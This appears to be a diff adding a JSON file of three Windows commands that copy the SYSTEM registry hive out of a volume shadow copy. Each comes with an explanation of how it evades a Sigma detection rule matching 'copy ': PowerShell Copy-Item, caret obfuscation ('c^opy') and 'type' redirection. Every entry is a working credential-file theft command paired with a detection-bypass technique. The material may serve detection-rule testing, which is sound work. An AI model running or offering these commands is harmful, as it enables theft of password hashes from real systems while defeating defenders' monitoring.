@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Copy-Item -Path '\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM' -Destination 'C:\\temp\\system.hive'\"",
+    "explanation": "The Sigma rule specifically looks for the exact string 'copy ' (with a trailing space). Using PowerShell's Copy-Item cmdlet evades this string match while achieving the same objective."
+  },
+  {
+    "output": "cmd.exe /c \"c^opy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.hive\"",
+    "explanation": "Command Prompt ignores caret (^) characters. Injecting a caret into the command ('c^opy') breaks the literal string match for 'copy ' in the detection rule, but the command still executes normally."
+  },
+  {
+    "output": "cmd.exe /c \"type \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM > C:\\temp\\system.hive\"",
+    "explanation": "Instead of using 'copy', the built-in 'type' command can read the file from the shadow copy and redirect its output to a new destination, completely bypassing the 'copy ' condition."
+  }
+]
